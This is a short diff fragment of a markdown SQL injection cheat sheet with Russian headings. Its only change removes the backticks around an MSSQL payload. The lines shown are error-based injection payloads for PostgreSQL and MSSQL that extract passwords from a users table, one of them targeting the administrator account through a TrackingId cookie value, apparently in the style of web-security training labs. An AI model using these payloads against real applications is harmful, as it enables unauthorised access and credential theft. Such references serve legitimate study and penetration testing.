@@ -255,7 +255,8 @@ TrackingId=xyz'||(SELECT password FROM users WHERE username='administrator')::in
 `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
 
 ### MSSQL
-`' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--`
+' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--
+
 ---
 
 ### 🔍 Проверить символ по позиции (если ошибки только меняют статус)
